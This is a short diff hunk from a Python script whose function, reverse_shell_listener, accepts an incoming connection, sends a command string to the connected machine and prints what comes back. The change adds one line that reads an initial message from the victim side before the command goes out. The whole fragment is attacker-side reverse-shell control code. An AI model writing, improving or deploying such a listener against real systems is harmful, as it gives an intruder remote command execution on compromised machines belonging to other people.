@@ -23,6 +23,7 @@ def reverse_shell_listener():
 		s.listen(10) # Listen for only 10 unaccepted connections.
 		conn, addr = s.accept() # Accept connections.
 		print("[+] Connected by", addr) # Print connected by ipaddress.
+		data = conn.recv(1024).decode("UTF-8") # Inital Connect
 		conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
 		data = conn.recv(1024).decode("UTF-8") # Receive output from command.
 		print(data) # Print the output of the command.
